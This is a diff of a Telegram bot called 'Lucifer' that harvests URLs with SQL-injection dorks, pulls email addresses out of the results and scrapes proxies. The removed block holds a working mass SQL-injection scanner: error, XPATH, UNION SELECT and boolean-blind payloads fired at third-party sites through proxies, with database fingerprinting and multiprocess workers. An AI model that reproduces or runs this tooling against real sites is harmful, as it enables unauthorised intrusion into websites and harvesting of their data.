             await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
             return MENU
-        _lf = _LIVE_FEED if "_LIVE_FEED" in globals() else {}
+        if not _LIVE_FEED:
+            await query.answer("💤 No active sessions", show_alert=True)
+            return MENU
+        lines = ["⚔️━━━━━━━━━━━━━━━━━━━━⚔️\n👁️ 𝗟𝗜𝗩𝗘 𝗙𝗘𝗘𝗗\n⚔️━━━━━━━━━━━━━━━━━━━━⚔️\n"]
+        for i, (sid, s) in enumerate(_LIVE_FEED.items(), 1):
+            lines.append(
+                f"*{i}. {s.get('name','?')}* (`{sid}`)\n"
+                f"  {s.get('phase','?')} | Started: `{s.get('start','?')}`\n"
+                f"  Dorks: `{s.get('dorks_done',0):,}/{s.get('dorks_total',0):,}` "
+                f"| URLs: `{s.get('urls_found',0):,}`\n"
+            )
+        lines.append("🔄 _Tap again to refresh_")
+        await query.edit_message_text(
+            "\n".join(lines),
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="admin_panel")]]),
+            parse_mode=ParseMode.MARKDOWN,
+        )
+        return MENU
+
+    elif data == "admin_scrapeproxy":
+        if not is_admin(user_id):
+            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
+            return MENU
+        await query.edit_message_text(
+            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
+            "🔄 𝙎𝙘𝙧𝙖𝙥𝙞𝙣𝙜 𝙋𝙧𝙤𝙭𝙞𝙚𝙨...\n"
+            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
+            "⏳ Fetching from all sources...",
+            parse_mode=ParseMode.MARKDOWN,
+        )
+        _raw = await _scrape_fresh_proxies()
+        if not _raw:
+            await query.edit_message_text(
+                "❌ No proxies fetched. Sources may be down.",
+                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Aᴅᴍɪɴ Pᴀɴᴇʟ", callback_data="admin_panel")]]),
+            )
+            return MENU
+        _parsed = [_parse_proxy(p) for p in _raw if p]
+        _before = len(global_proxy_pool)
+        for _p in _parsed:
+            if _p not in global_proxy_pool:
+                global_proxy_pool.append(_p)
+        _save_proxies()
+        _added = len(global_proxy_pool) - _before
+        await query.edit_message_text(
+            f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
+            f"⚔️ 𝙎𝙘𝙧𝙖𝙥𝙚 𝘿𝙤𝙣𝙚\n"
+            f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
+            f"📥 Fetched raw: `{{len(_raw):,}}`\n"
+            f"➕ New added: `{{_added:,}}`\n"
+            f"🌊 Pool total: `{{len(global_proxy_pool):,}}`\n\n"
+            f"🔄 _Background cleaner validating dead proxies..._",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Aᴅᴍɪɴ Pᴀɴᴇʟ", callback_data="admin_panel")]]),
+            parse_mode=ParseMode.MARKDOWN,
+        )
+        return MENU
+
+    elif data == "admin_livefeed":
+        if not is_admin(user_id):
+            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
+            return MENU
+        _lf = _LIVE_FEED if "_LIVE_FEED" in dir() else {}
         if not _lf:
             await query.answer("💤 No active sessions", show_alert=True)
             return MENU
@@ -6631,7 +6022,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         if not is_admin(user_id):
             await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
             return MENU
-        _sc = len(_SCANNED_URLS) if "_SCANNED_URLS" in globals() else 0
+        _sc = len(_SCANNED_URLS) if "_SCANNED_URLS" in dir() else 0
         await query.edit_message_text(
             "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
             "🔁 𝗗𝗲𝗱𝘂𝗽 𝗗𝗮𝘁𝗮𝗯𝗮𝘀𝗲\n"
@@ -6691,66 +6082,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
             f"🕷️ Bᴏᴛ: Oɴʟɪɴᴇ ✅",
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Rᴇғʀᴇsʜ", callback_data="admin_serverinfo"),
                                                 InlineKeyboardButton("⬅️ Aᴅᴍɪɴ Pᴀɴᴇʟ", callback_data="admin_panel")]]),
-            parse_mode=ParseMode.MARKDOWN,
-        )
-        return MENU
-
-    elif data == "admin_aikeys":
-        if not is_admin(user_id):
-            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
-            return MENU
-        await query.edit_message_text(
-            _ai_keys_status_text(),
-            reply_markup=make_ai_keys_kb(),
-            parse_mode=ParseMode.MARKDOWN,
-        )
-        return MENU
-
-    elif data in ("setkey_anthropic", "setkey_gemini", "setkey_openrouter"):
-        if not is_admin(user_id):
-            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
-            return MENU
-        prov = data.replace("setkey_", "")
-        context.user_data["waiting_for_ai_key"] = prov
-        _names = {
-            "anthropic": "🔵 Anthropic Claude (starts with sk-ant-...)",
-            "gemini": "🟢 Google Gemini (starts with AIza...)",
-            "openrouter": "🟡 OpenRouter (starts with sk-or-...)",
-        }
-        await query.edit_message_text(
-            f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
-            f"✏️ 𝙎𝙚𝙩 {_names.get(prov, prov)}\n"
-            f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n"
-            f"Send / paste your **{prov.title()} API Key** in chat now.\n\n"
-            f"❌ Send `/cancel` to abort.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_aikeys")]]),
-            parse_mode=ParseMode.MARKDOWN,
-        )
-        return MENU
-
-    elif data == "delkey_all":
-        if not is_admin(user_id):
-            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
-            return MENU
-        _save_ai_key("anthropic", "")
-        _save_ai_key("gemini", "")
-        _save_ai_key("openrouter", "")
-        await query.edit_message_text(
-            "🗑️ *All AI Provider Keys Cleared!*\n\n" + _ai_keys_status_text(),
-            reply_markup=make_ai_keys_kb(),
-            parse_mode=ParseMode.MARKDOWN,
-        )
-        return MENU
-
-    elif data in ("delkey_anthropic", "delkey_gemini", "delkey_openrouter"):
-        if not is_admin(user_id):
-            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
-            return MENU
-        prov = data.replace("delkey_", "")
-        _save_ai_key(prov, "")
-        await query.edit_message_text(
-            f"🗑️ *{prov.title()} Key Cleared!*\n\n" + _ai_keys_status_text(),
-            reply_markup=make_ai_keys_kb(),
             parse_mode=ParseMode.MARKDOWN,
         )
         return MENU
@@ -7133,7 +6464,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         if not has_access(user_id):
             await query.answer("❌ Access denied", show_alert=True)
             return MENU
-        context.user_data["waiting_for_aigen_topic"] = True
         await query.edit_message_text(
             "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
             "🤖 𝘼𝙄 𝙆𝙚𝙮𝙬𝙤𝙧𝙙𝙨 𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙤𝙧\n"
@@ -7160,7 +6490,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         if not has_access(user_id):
             await query.answer("❌ Access denied", show_alert=True)
             return MENU
-        _sc = len(_SCANNED_URLS) if "_SCANNED_URLS" in globals() else 0
+        _sc = len(_SCANNED_URLS) if "_SCANNED_URLS" in dir() else 0
         await query.edit_message_text(
             "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
             "🔁 Sᴍᴀʀᴛ Dᴇᴅᴜᴘ Sᴛᴀᴛᴜs\n"
@@ -7623,13 +6953,13 @@ async def _run_keyword_gen(update: Update, context: ContextTypes.DEFAULT_TYPE, s
             try:
                 spin_frame[0] = (spin_frame[0] + 1) % len(KW_SPINNER_FRAMES)
                 await msg.edit_text(KW_SPINNER_FRAMES[spin_frame[0]], parse_mode=ParseMode.MARKDOWN)
-                await asyncio.sleep(1.2)
+                await asyncio.sleep(0.3)
             except Exception:
                 break
 
     anim_task = asyncio.create_task(animate())
     loop      = asyncio.get_running_loop()
-    keywords  = await loop.run_in_executor(_THREAD_POOL, generate_keywords, seeds, count)
+    keywords  = await loop.run_in_executor(None, generate_keywords, seeds, count)
     anim_task.cancel()
     try:
         await anim_task
@@ -7742,7 +7072,7 @@ async def _run_dork_gen(update: Update, context: ContextTypes.DEFAULT_TYPE, keyw
             try:
                 await msg.edit_text(frames[i % len(frames)], parse_mode=ParseMode.MARKDOWN)
                 i += 1
-                await asyncio.sleep(1.2)
+                await asyncio.sleep(0.3)
             except Exception:
                 break
 
@@ -7752,19 +7082,19 @@ async def _run_dork_gen(update: Update, context: ContextTypes.DEFAULT_TYPE, keyw
     # Dispatch to the correct generator
     if dork_type == "hq":
         dorks = await loop.run_in_executor(
-            _THREAD_POOL, lambda: generate_hq_sqli_dorks(keywords=keywords, limit=count)
+            None, lambda: generate_hq_sqli_dorks(keywords=keywords, limit=count)
         )
     elif dork_type == "country":
         dorks = await loop.run_in_executor(
-            _THREAD_POOL, lambda: generate_country_dorks(keywords=keywords, limit=count)
+            None, lambda: generate_country_dorks(keywords=keywords, limit=count)
         )
     elif dork_type == "cms":
         dorks = await loop.run_in_executor(
-            _THREAD_POOL, lambda: generate_cms_dorks(keywords=keywords, limit=count)
+            None, lambda: generate_cms_dorks(keywords=keywords, limit=count)
         )
     elif dork_type == "exposed":
         dorks = await loop.run_in_executor(
-            _THREAD_POOL, lambda: generate_exposed_dorks(keywords=keywords, limit=count)
+            None, lambda: generate_exposed_dorks(keywords=keywords, limit=count)
         )
     else:
         dorks = await loop.run_in_executor(None, generate_dorks, keywords, count)
@@ -7849,9 +7179,14 @@ async def _run_parser(update: Update, context: ContextTypes.DEFAULT_TYPE, dorks:
     # 500k dorks ➪ ~12 hours; 1k dorks ➪ ~10 min
     _timeout_secs = max(600, min(int(total * 2), 43200))
     # Scale URL limit: allow up to total × 2 URLs (realistic ceiling)
-    _url_limit    = max(250_000, total * 3)
+    _url_limit    = max(100_000, total * 2)
     # DDGS variant label for display
-    _engine_label = f"{min(os.cpu_count() or 12, 12)}-Core Rust TLS + DDGS + Bing×3 + Yahoo×2"
+    if total <= 500:
+        _engine_label = "DDGS×3 + Bing"
+    elif total <= 5000:
+        _engine_label = "DDGS×2 + Bing"
+    else:
+        _engine_label = "DDGS×1 + Bing (HQ mode)"
 
     _start_time   = time.monotonic()
 
@@ -7976,73 +7311,32 @@ async def _run_parser(update: Update, context: ContextTypes.DEFAULT_TYPE, dorks:
         parse_mode=ParseMode.MARKDOWN,
     )
 
-    # ── Preserve 100% of ALL scraped HQ URLs + also compute fresh unseen subset ──
-    _all_found_urls = list(found_urls)
-    _fresh_only_urls = [u for u in _all_found_urls if u not in _SCANNED_URLS]
-    _dedup_removed = len(_all_found_urls) - len(_fresh_only_urls)
-    _SCANNED_URLS.update(_fresh_only_urls)
+    # ── Dedup — remove already scanned URLs ──────────────────────────────────
+    _before_dedup = len(found_urls)
+    found_urls    = [u for u in found_urls if u not in _SCANNED_URLS]
+    _dedup_removed = _before_dedup - len(found_urls)
+    # Add to scanned set + persist
+    _SCANNED_URLS.update(found_urls)
     _save_scanned()
     _clear_checkpoint(user_id)
     _LIVE_FEED.pop(user_id, None)
 
-    async def _send_large_url_lines(lines_list: list, prefix_name: str, cap_base: str):
-        _MAX_TG_BYTES = 44 * 1024 * 1024
-        raw_bytes = "\n".join(lines_list).encode("utf-8")
-        if len(raw_bytes) <= _MAX_TG_BYTES:
-            for _try_i in range(3):
-                try:
-                    await update.message.reply_document(
-                        document=io.BytesIO(raw_bytes),
-                        filename=f"{prefix_name}_{len(lines_list)}_{ts}.txt",
-                        caption=cap_base,
-                        parse_mode=ParseMode.MARKDOWN,
-                        read_timeout=180.0,
-                        write_timeout=180.0,
-                        connect_timeout=60.0,
-                    )
-                    break
-                except Exception:
-                    if _try_i == 2:
-                        raise
-                    await asyncio.sleep(2.0)
-        else:
-            _n_parts = (len(raw_bytes) // _MAX_TG_BYTES) + 1
-            _chunk_sz = max(1, (len(lines_list) + _n_parts - 1) // _n_parts)
-            _parts = [lines_list[k:k + _chunk_sz] for k in range(0, len(lines_list), _chunk_sz)]
-            for _pi, _part in enumerate(_parts, 1):
-                _pb = "\n".join(_part).encode("utf-8")
-                await update.message.reply_document(
-                    document=io.BytesIO(_pb),
-                    filename=f"{prefix_name}_part{_pi}of{len(_parts)}_{len(_part)}_{ts}.txt",
-                    caption=f"📦 Part {_pi}/{len(_parts)} (`{len(_part):,}` URLs)\n{cap_base}",
-                    parse_mode=ParseMode.MARKDOWN,
-                    read_timeout=180.0,
-                    write_timeout=180.0,
-                    connect_timeout=60.0,
-                )
-
-    if _all_found_urls:
-        ts = datetime.now().strftime("%d%m%y_%H%M")
-        await _send_large_url_lines(
-            _all_found_urls,
-            "lucifer_urls",
-            (
-                f"⚔️ `{len(_all_found_urls):,}` Hɪɢʜ-Qᴜᴀʟɪᴛʏ URLs Fʀᴏᴍ `{len(dorks):,}` Dᴏʀᴋs\n"
-                f"✨ Nᴇᴡ: `{len(_fresh_only_urls):,}` | Rᴇ-Vᴇʀɪꜰɪᴇᴅ: `{_dedup_removed:,}`\n"
-                f"🌑 Lᴜᴄɪꜰᴇʀ 12-Cᴏʀᴇ Bᴏᴛ ⚔️"
+    if found_urls:
+        ts       = datetime.now().strftime("%d%m%y_%H%M")
+        filename = f"lucifer_urls_{len(found_urls)}_{ts}.txt"
+        content  = "\n".join(found_urls).encode("utf-8")
+        _dedup_note = f"\n🔁 Dedup removed: `{_dedup_removed:,}` already-seen" if _dedup_removed else ""
+        await update.message.reply_document(
+            document=io.BytesIO(content),
+            filename=filename,
+            caption=(
+                f"⚔️ `{len(found_urls):,}` URLs Fʀᴏᴍ `{len(dorks):,}` Dᴏʀᴋs"
+                f"{_dedup_note}\n🌑 Lᴜᴄɪꜰᴇʀ Bᴏᴛ ⚔️"
             ),
+            parse_mode=ParseMode.MARKDOWN,
         )
-        if 0 < len(_fresh_only_urls) < len(_all_found_urls):
-            await _send_large_url_lines(
-                _fresh_only_urls,
-                "lucifer_fresh_only_urls",
-                (
-                    f"🆕 `{len(_fresh_only_urls):,}` Bʀᴀɴᴅ-Nᴇᴡ Uɴsᴇᴇɴ URLs (Dᴇᴅᴜᴘᴇᴅ)\n"
-                    f"🌑 Lᴜᴄɪꜰᴇʀ 12-Cᴏʀᴇ Bᴏᴛ ⚔️"
-                ),
-            )
         # ── Auto email harvest ────────────────────────────────────────────────
-        _all_text = "\n".join(_all_found_urls)
+        _all_text = "\n".join(found_urls)
         _emails   = _extract_emails(_all_text)
         if _emails:
             _econtent = "\n".join(_emails).encode("utf-8")
@@ -8051,26 +7345,20 @@ async def _run_parser(update: Update, context: ContextTypes.DEFAULT_TYPE, dorks:
                 filename=f"lucifer_emails_{len(_emails)}_{ts}.txt",
                 caption=f"📧 `{len(_emails):,}` Eᴍᴀɪʟs Exᴛʀᴀᴄᴛᴇᴅ Fʀᴏᴍ URLs\n⚔️ Lᴜᴄɪꜰᴇʀ Bᴏᴛ",
                 parse_mode=ParseMode.MARKDOWN,
-                read_timeout=180.0,
-                write_timeout=180.0,
             )
-        # ── Auto CSV export (safe under Telegram 50MB cap) ────────────────────
+        # ── Auto CSV export ───────────────────────────────────────────────────
         import csv as _csv
         _csvbuf = io.StringIO()
         _w = _csv.writer(_csvbuf)
         _w.writerow(["#", "URL"])
-        for _i, _u in enumerate(_all_found_urls, 1):
+        for _i, _u in enumerate(found_urls, 1):
             _w.writerow([_i, _u])
-        _csv_bytes = _csvbuf.getvalue().encode("utf-8")
-        if len(_csv_bytes) <= 44 * 1024 * 1024:
-            await update.message.reply_document(
-                document=io.BytesIO(_csv_bytes),
-                filename=f"lucifer_urls_{len(_all_found_urls)}_{ts}.csv",
-                caption=f"📊 CSV Export — `{len(_all_found_urls):,}` URLs",
-                parse_mode=ParseMode.MARKDOWN,
-                read_timeout=180.0,
-                write_timeout=180.0,
-            )
+        await update.message.reply_document(
+            document=io.BytesIO(_csvbuf.getvalue().encode("utf-8")),
+            filename=f"lucifer_urls_{len(found_urls)}_{ts}.csv",
+            caption=f"📊 CSV Export — `{len(found_urls):,}` URLs",
+            parse_mode=ParseMode.MARKDOWN,
+        )
     else:
         await update.message.reply_text(
             f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
@@ -8087,576 +7375,7 @@ async def _run_parser(update: Update, context: ContextTypes.DEFAULT_TYPE, dorks:
     return MENU
 
 
-# ── SQLi SCANNER (HYPER V6 ANTI-STUCK WORK-STEALING 12-CORE ENGINE) ──────────
-import multiprocessing as _sqli_mp
-
-_STRICT_DBMS_REGEXES = [
-    ("MySQL",      re.compile(r"you have an error in your sql syntax|check the manual that corresponds to your (?:mysql|mariadb)|mysqli?_fetch_|mysqli?_num_rows|mysqli_sql_exception|supplied argument is not a valid mysql|operand should contain \d+ column|unknown column '[^']+' in '(?:where|field|order)", re.I)),
-    ("PostgreSQL", re.compile(r"pg_query\(\): query failed|pg::syntaxerror|psqlexception|unterminated quoted string at or near|invalid input syntax for (?:type )?integer|org\.postgresql\.util", re.I)),
-    ("MSSQL",      re.compile(r"unclosed quotation mark after the character string|microsoft ole db provider for sql server|odbc sql server driver|sqlserver jdbc driver|incorrect syntax near", re.I)),
-    ("Oracle",     re.compile(r"\bora-(?:009\d\d|017\d\d|014\d\d|065\d\d)\b|quoted string not properly terminated", re.I)),
-    ("SQLite/PDO", re.compile(r"sqlite3::sqlexception|unrecognized token:|sqlstate\[42[0-9a-z]{3}\]", re.I)),
-    ("MSAccess",   re.compile(r"microsoft jet database engine|odbc microsoft access driver", re.I)),
-]
-
-_PRIORITY_PARAM_NAMES = (
-    "id", "item", "pid", "cat", "cid", "prod", "product", "page_id", "news_id",
-    "art", "article", "uid", "user", "view", "num", "no", "nid", "bid", "sid",
-)
-
-
-def _match_strict_dbms_error(html: str, baseline_html: str) -> str:
-    if not html:
-        return ""
-    for dbms_name, rx in _STRICT_DBMS_REGEXES:
-        if rx.search(html) and not rx.search(baseline_html or ""):
-            return dbms_name
-    return ""
-
-
-def _build_param_url(url: str, pairs: list, idx: int, new_val: str) -> str:
-    p = urlparse(url)
-    updated = list(pairs)
-    updated[idx] = (pairs[idx][0], new_val)
-    return urlunparse(p._replace(query=urlencode(updated, doseq=True)))
-
-
-def _endpoint_signature(url: str) -> str:
-    try:
-        p = urlparse(url)
-        host = p.netloc.lower().lstrip("www.")
-        keys = tuple(sorted(k.lower() for k, _ in parse_qsl(p.query, keep_blank_values=True)))
-        return f"{host}{p.path.lower()}?{','.join(keys)}"
-    except Exception:
-        return url
-
-
-async def _http_fetch_resilient(session: aiohttp.ClientSession, url: str, custom_px: list) -> tuple[int, str]:
-    """
-    Ultra-crisp non-hanging HTTP fetcher (`3.4s` max total, `1.8s` connect, `2.5s` read):
-      - Clean Direct Gigabit VPS IP by default
-      - Optional user custom proxy with instant Direct fallback on failure
-      - NEVER hangs on drip honeypots or silent firewall drops!
-    """
-    attempts = []
-    if custom_px:
-        attempts.append(random.choice(custom_px))
-    attempts.append("")
-
-    for px in attempts:
-        try:
-            kw = {
-                "timeout": aiohttp.ClientTimeout(total=3.4, sock_connect=1.8, sock_read=2.5),
-                "ssl": False,
-                "allow_redirects": True,
-                "headers": {
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                },
-            }
-            if px:
-                kw["proxy"] = px
-            async with session.get(url, **kw) as resp:
-                # Cap body read to 384 KB so giant 50MB video/ISO pages never stall memory/socket!
-                raw_bytes = await resp.content.read(393_216)
-                body = raw_bytes.decode("utf-8", errors="ignore")
-                return resp.status, body
-        except Exception:
-            continue
-    return 0, ""
-
-
-async def _verify_sqli_inner(
-    session: aiohttp.ClientSession,
-    url: str,
-    custom_px: list = None,
-) -> tuple[str, str]:
-    try:
-        p = urlparse(url)
-        pairs = parse_qsl(p.query, keep_blank_values=True)
-    except Exception:
-        return "skip", ""
-
-    if not pairs:
-        return "skip", ""
-
-    base_code, base_html = await _http_fetch_resilient(session, url, custom_px)
-    if base_code == 0 or (base_code >= 500 and not base_html):
-        return "dead", ""
-
-    indexed_params = list(enumerate(pairs))
-    indexed_params.sort(
-        key=lambda item: (
-            0 if any(pk in item[1][0].lower() for pk in _PRIORITY_PARAM_NAMES) else 1,
-            0 if item[1][1].isdigit() else 1,
-            item[0],
-        )
-    )
-    target_params = indexed_params[:3]
-
-    MARK_ASCII = "LBV5X99"
-    MARK_HEX   = "0x4c425635583939"
-
-    for pidx, (pname, orig_val) in target_params:
-        safe_orig = orig_val if orig_val != "" else "1"
-
-        # ── WAVE 1: Parallel Error + XPATH + WAF Blackhole Detection ─────────
-        err_probes = [
-            ("sq1",  f"{safe_orig}'"),
-            ("dq1",  f'{safe_orig}"'),
-            ("pq1",  f"{safe_orig}')"),
-            ("numq", f"{safe_orig}' OR '1'='2"),
-            ("xp_n", f"{safe_orig} AND EXTRACTVALUE(1,CONCAT(0x7e,{MARK_HEX}))-- -"),
-            ("xp_s", f"{safe_orig}' AND EXTRACTVALUE(1,CONCAT(0x7e,{MARK_HEX}))-- -"),
-        ]
-        wave1 = await asyncio.gather(
-            *[_http_fetch_resilient(session, _build_param_url(url, pairs, pidx, pv), custom_px) for _, pv in err_probes],
-            return_exceptions=True,
-        )
-
-        # CIRCUIT BREAKER: If firewall silently dropped ALL 6 SQL probes after 200 OK baseline,
-        # abort this firewalled host IMMEDIATELY instead of hanging for minutes at 97%!
-        alive_in_wave1 = sum(1 for r in wave1 if isinstance(r, tuple) and r[0] != 0)
-        if alive_in_wave1 == 0:
-            return "clean", ""
-
-        for (tag, pv), res in zip(err_probes, wave1):
-            if not isinstance(res, tuple):
-                continue
-            _, body = res
-            if body and MARK_ASCII in body and MARK_ASCII not in base_html:
-                return "vuln", f"XPATH-ERROR ({pname})"
-            dbms = _match_strict_dbms_error(body, base_html)
-            if dbms:
-                _, confirm_body = await _http_fetch_resilient(
-                    session, _build_param_url(url, pairs, pidx, pv), custom_px
-                )
-                if _match_strict_dbms_error(confirm_body, base_html):
-                    return "vuln", f"ERROR:{dbms} ({pname})"
-
-        # ── WAVE 2: Parallel Numeric + String UNION ALL SELECT (`1..10` cols) ──
-        async def _try_union(mode_tag: str, prefix_str: str, cols_n: int):
-            slots = ",".join([MARK_HEX] * cols_n)
-            u_test = _build_param_url(url, pairs, pidx, f"{prefix_str} UNION ALL SELECT {slots}-- -")
-            _, b_txt = await _http_fetch_resilient(session, u_test, custom_px)
-            if b_txt and MARK_ASCII in b_txt and MARK_ASCII not in base_html:
-                return f"{mode_tag}:{cols_n}cols ({pname})"
-            return ""
-
-        union_tasks = []
-        for c_n in range(1, 11):
-            union_tasks.append(_try_union("UNION-INT", "-999999", c_n))
-            union_tasks.append(_try_union("UNION-STR", f"{safe_orig}' AND 1=2", c_n))
-        u_out = await asyncio.gather(*union_tasks, return_exceptions=True)
-        for hit in u_out:
-            if isinstance(hit, str) and hit:
-                return "vuln", hit
-
-        # ── WAVE 3: Quad-Verified Equal-Length Boolean-Blind Differential ────
-        if base_code == 200 and len(base_html) >= 120:
-            bool_modes = [
-                ("BOOL-INT",
-                 f"{safe_orig} AND 4829=4829", f"{safe_orig} AND 4829=4830",
-                 f"{safe_orig} AND 7391=7391", f"{safe_orig} AND 7391=7392"),
-                ("BOOL-STR",
-                 f"{safe_orig}' AND '4829'='4829", f"{safe_orig}' AND '4829'='4830",
-                 f"{safe_orig}' AND '7391'='7391", f"{safe_orig}' AND '7391'='7392"),
-            ]
-            for b_label, t1_p, f1_p, t2_p, f2_p in bool_modes:
-                (c_t1, b_t1), (c_f1, b_f1) = await asyncio.gather(
-                    _http_fetch_resilient(session, _build_param_url(url, pairs, pidx, t1_p), custom_px),
-                    _http_fetch_resilient(session, _build_param_url(url, pairs, pidx, f1_p), custom_px),
-                )
-                if c_t1 == 200 and c_f1 in (200, 404, 500):
-                    diff1 = abs(len(b_t1) - len(b_f1))
-                    if diff1 >= max(160, int(0.10 * max(len(b_t1), 1))) and abs(len(b_t1) - len(base_html)) <= max(250, int(0.08 * len(base_html))):
-                        (c_t2, b_t2), (c_f2, b_f2) = await asyncio.gather(
-                            _http_fetch_resilient(session, _build_param_url(url, pairs, pidx, t2_p), custom_px),
-                            _http_fetch_resilient(session, _build_param_url(url, pairs, pidx, f2_p), custom_px),
-                        )
-                        if (
-                            c_t2 == 200
-                            and abs(len(b_t1) - len(b_t2)) <= max(90, int(0.03 * max(len(b_t1), 1)))
-                            and abs(len(b_f1) - len(b_f2)) <= max(90, int(0.03 * max(len(b_t1), 1)))
-                            and abs(len(b_t2) - len(b_f2)) >= max(160, int(0.10 * max(len(b_t2), 1)))
-                        ):
-                            return "vuln", f"{b_label} ({pname})"
-
-    return "clean", ""
-
-
-async def _verify_sqli_url_v5(
-    session: aiohttp.ClientSession,
-    url: str,
-    custom_px: list = None,
-) -> tuple[str, str]:
-    """
-    HARD 6.0-SECOND WALL-CLOCK CAP PER URL!
-    Even if a honeypot drips 1 byte/sec forever or DNS hangs in glibc, NO single URL
-    can EVER stall any coroutine past 6.0 seconds!
-    """
-    try:
-        return await asyncio.wait_for(_verify_sqli_inner(session, url, custom_px), timeout=6.0)
-    except asyncio.TimeoutError:
-        return "clean", ""
-    except Exception:
-        return "dead", ""
-
-
-async def _check_injectable(session: aiohttp.ClientSession, url: str,
-                            proxy_url: str = "") -> bool:
-    st, _ = await _verify_sqli_url_v5(session, url, [proxy_url] if proxy_url else None)
-    return st == "vuln"
-
-
-async def _sqli_worksteal_async(
-    url_source_fn,
-    custom_px: list,
-    report_fn=None,
-    stop_check_fn=None,
-) -> dict:
-    """
-    Runs inside each CPU core with:
-      - Dedicated 128-thread DNS ThreadPoolExecutor (NEVER clogs on dead nameservers!)
-      - Dynamic work-stealing batch pull (`url_source_fn()`) so ALL 12 cores share load to 100%!
-      - `limit_per_host=24` so all 20 UNION probes fire in 1 parallel burst instead of queuing!
-    """
-    loop = asyncio.get_running_loop()
-    dns_pool = concurrent.futures.ThreadPoolExecutor(max_workers=128)
-    loop.set_default_executor(dns_pool)
-
-    vuln_items = []
-    clean_cnt = 0
-    dead_cnt = 0
-    skip_cnt = 0
-    done_cnt = 0
-    last_rep = 0.0
-
-    conn = aiohttp.TCPConnector(limit=250, limit_per_host=0, ssl=False, ttl_dns_cache=600)
-    sem = asyncio.Semaphore(100)
-    local_buf = asyncio.Queue()
-    exhausted = False
-
-    async with aiohttp.ClientSession(connector=conn) as sess:
-        async def _worker():
-            nonlocal clean_cnt, dead_cnt, skip_cnt, done_cnt, last_rep, exhausted
-            while True:
-                if stop_check_fn and stop_check_fn():
-                    break
-                try:
-                    u = local_buf.get_nowait()
-                except asyncio.QueueEmpty:
-                    if exhausted:
-                        break
-                    batch = url_source_fn()
-                    if not batch:
-                        exhausted = True
-                        break
-                    for item_u in batch[1:]:
-                        local_buf.put_nowait(item_u)
-                    u = batch[0]
-
-                try:
-                    async with sem:
-                        st, det = await _verify_sqli_url_v5(sess, u, custom_px)
-                    if st == "vuln":
-                        vuln_items.append((u, det))
-                    elif st == "clean":
-                        clean_cnt += 1
-                    elif st == "dead":
-                        dead_cnt += 1
-                    else:
-                        skip_cnt += 1
-                except Exception:
-                    dead_cnt += 1
-                done_cnt += 1
-                now = time.monotonic()
-                if report_fn and (now - last_rep >= 0.8):
-                    last_rep = now
-                    report_fn(done_cnt, len(vuln_items), clean_cnt, dead_cnt, skip_cnt)
-
-        await asyncio.gather(*[asyncio.create_task(_worker()) for _ in range(96)], return_exceptions=True)
-
-    if report_fn:
-        report_fn(done_cnt, len(vuln_items), clean_cnt, dead_cnt, skip_cnt)
-    dns_pool.shutdown(wait=False, cancel_futures=True)
-    return {
-        "vuln": vuln_items,
-        "clean": clean_cnt,
-        "dead": dead_cnt,
-        "skip": skip_cnt,
-        "done": done_cnt,
-    }
-
-
-def _sqli_mp_worker_entry(wid: int, work_q, custom_px: list, out_path: str, prog_q, stop_val):
-    """Forked worker process: steals batches from shared `work_q`, writes RAM file, exits in 0ms via `os._exit(0)`!"""
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    try:
-        def _pull_batch():
-            try:
-                return work_q.get_nowait()
-            except Exception:
-                return None
-
-        def _rep(dn, vn, cn, ddn, sn):
-            try:
-                prog_q.put_nowait(("prog", wid, dn, vn, cn, ddn, sn))
-            except Exception:
-                pass
-
-        res = loop.run_until_complete(
-            _sqli_worksteal_async(
-                _pull_batch,
-                custom_px,
-                report_fn=_rep,
-                stop_check_fn=lambda: bool(stop_val.value),
-            )
-        )
-        with open(out_path, "w", encoding="utf-8") as wf:
-            json.dump(res, wf)
-        prog_q.put(("done", wid, len(res["vuln"]), res["clean"], res["dead"], res["skip"], res["done"]))
-        prog_q.close()
-        prog_q.join_thread()
-    except Exception:
-        try:
-            with open(out_path, "w", encoding="utf-8") as wf:
-                json.dump({"vuln": [], "clean": 0, "dead": 0, "skip": 0, "done": 0}, wf)
-            prog_q.put(("done", wid, 0, 0, 0, 0, 0))
-            prog_q.close()
-            prog_q.join_thread()
-        except Exception:
-            pass
